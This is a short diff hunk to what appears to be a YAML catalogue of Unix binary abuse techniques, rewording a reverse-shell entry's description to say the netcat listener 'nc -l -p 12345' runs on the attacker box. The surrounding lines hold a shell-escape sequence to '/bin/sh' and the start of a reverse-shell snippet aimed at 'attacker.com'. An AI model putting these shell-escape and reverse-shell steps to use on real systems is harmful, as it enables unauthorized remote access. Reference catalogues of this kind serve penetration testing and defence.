@@ -9,7 +9,7 @@ functions:
         ^]
         !/bin/sh
   reverse-shell:
-    - description: Run `nc -l -p 12345` to receive the shell on the other end.
+    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
         RHOST=attacker.com
         RPORT=12345
